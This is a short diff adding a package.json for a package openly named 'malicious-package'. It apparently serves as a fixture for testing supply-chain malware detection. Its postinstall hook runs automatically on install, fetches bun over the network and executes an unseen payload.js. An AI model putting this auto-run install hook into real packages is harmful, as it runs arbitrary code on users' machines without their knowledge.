@@ -1,0 +1,8 @@
+{
+  "name": "malicious-package",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "npx bun install && node payload.js"
+  },
+  "dependencies": {}
+}
